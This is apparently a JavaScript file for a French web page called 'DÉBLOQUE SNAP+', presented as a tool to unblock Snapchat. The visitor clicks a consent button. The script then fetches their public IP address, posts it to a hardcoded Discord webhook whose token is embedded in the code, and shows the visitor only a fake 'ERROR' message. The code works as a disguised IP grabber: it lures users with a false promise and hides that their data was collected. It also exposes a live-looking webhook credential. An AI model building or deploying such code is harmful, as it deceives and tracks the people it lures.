"use strict";

// ============================================================
// DÉBLOQUE SNAP+ - APP.JS
// ============================================================

// ⚠️ ATTENTION SÉCURITÉ :
// L'URL ci-dessous sera visible par N'IMPORTE QUI qui ouvre
// le code source de la page (clic droit > Afficher le code
// source, ou l'onglet Réseau du navigateur). N'importe qui
// peut la récupérer et spammer ton webhook Discord avec de
// fausses données.
// Pour un vrai usage de contrôle d'accès, préfère un petit
// backend (Cloudflare Worker / Vercel Function / etc.) qui
// reçoit l'IP et relaie vers Discord, sans jamais exposer
// l'URL du webhook au navigateur.

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1556094459886960640/MD9x_rklJv59N9ET_nVyC7kl87U857FmCsGb1a2hVDn9BkxcbDzhZBtuXhZC_Bw02Gzx";

// Récupération des éléments HTML
const startButton = document.getElementById("startButton");
const confirmButton = document.getElementById("confirmButton");
const cancelButton = document.getElementById("cancelButton");
const closeButton = document.getElementById("closeButton");

const consentModal = document.getElementById("consentModal");
const result = document.getElementById("result");

const publicIP = document.getElementById("publicIP");
const status = document.getElementById("status");

// Vérification des éléments
if (
    !startButton ||
    !confirmButton ||
    !cancelButton ||
    !closeButton ||
    !consentModal ||
    !result ||
    !publicIP ||
    !status
) {
    console.error(
        "❌ Erreur : un ou plusieurs éléments HTML sont introuvables."
    );
} else {

    // ========================================================
    // ENVOI VERS LE WEBHOOK DISCORD
    // ========================================================

    async function sendIpToDiscord(ip) {

        // Si l'URL n'a pas été configurée, on n'envoie rien
        if (
            !DISCORD_WEBHOOK_URL ||
            DISCORD_WEBHOOK_URL === "COLLE_TON_URL_WEBHOOK_ICI"
        ) {
            console.warn(
                "⚠️ Webhook Discord non configuré. Rien n'a été envoyé."
            );
            return;
        }

        try {

            const payload = {
                username: "DÉBLOQUE SNAP+",
                embeds: [
                    {
                        title: "🌍 Nouvelle IP autorisée",
                        color: 0x7655ff,
                        fields: [
                            {
                                name: "Adresse IP",
                                value: `\`${ip}\``,
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(
                    `Webhook Discord a répondu avec le statut ${response.status}`
                );
            }

        } catch (error) {
            console.error(
                "Erreur lors de l'envoi vers le webhook Discord :",
                error
            );
        }
    }


    // ========================================================
    // BOUTON COMMENCER
    // ========================================================

    startButton.addEventListener("click", function () {
        consentModal.classList.remove("hidden");
    });


    // ========================================================
    // BOUTON REFUSER
    // ========================================================

    cancelButton.addEventListener("click", function () {
        consentModal.classList.add("hidden");

        result.classList.add("visible");

        publicIP.textContent = "Non récupérée";

        status.textContent =
            "❌ Autorisation refusée. Aucune adresse IP n'a été consultée.";
    });


    // ========================================================
    // BOUTON AUTORISER
    // ========================================================

    confirmButton.addEventListener("click", async function () {

        // Ferme la fenêtre
        consentModal.classList.add("hidden");

        // Affiche le résultat
        result.classList.add("visible");

        // État de chargement
        publicIP.textContent = "Recherche...";

        status.textContent =
            "📡 Récupération de votre adresse IP publique...";

        // Empêche les doubles clics
        confirmButton.disabled = true;

        try {

            // Récupération de l'IP publique
            const response = await fetch(
                "https://api.ipify.org?format=json",
                {
                    method: "GET",
                    cache: "no-store"
                }
            );

            // Vérification de la réponse
            if (!response.ok) {
                throw new Error(
                    "Impossible de récupérer l'adresse IP."
                );
            }

            // Conversion JSON
            const data = await response.json();

            // Vérification de l'IP
            if (!data || !data.ip) {
                throw new Error(
                    "Aucune adresse IP n'a été retournée."
                );
            }

            // Affichage de l'IP
            publicIP.textContent = data.ip;

            status.textContent =
                "❌ ERROR.";

            // Envoi vers le webhook Discord
            await sendIpToDiscord(data.ip);

        } catch (error) {

            console.error(
                "Erreur lors de la récupération de l'IP :",
                error
            );

            publicIP.textContent =
                "Impossible à récupérer";

            status.textContent =
                "❌ Impossible de récupérer votre adresse IP. Vérifiez votre connexion.";
        }

        // Réactive le bouton
        confirmButton.disabled = false;
    });


    // ========================================================
    // BOUTON FERMER
    // ========================================================

    closeButton.addEventListener("click", function () {

        result.classList.remove("visible");

    });


    // ========================================================
    // TOUCHE ESC
    // ========================================================

    document.addEventListener("keydown", function (event) {

        if (event.key === "Escape") {

            consentModal.classList.add("hidden");

            result.classList.remove("visible");

        }

    });


    // ========================================================
    // MESSAGE DE CHARGEMENT
    // ========================================================

    console.log(
        "✅ DÉBLOQUE SNAP+ : app.js chargé correctement."
    );
}
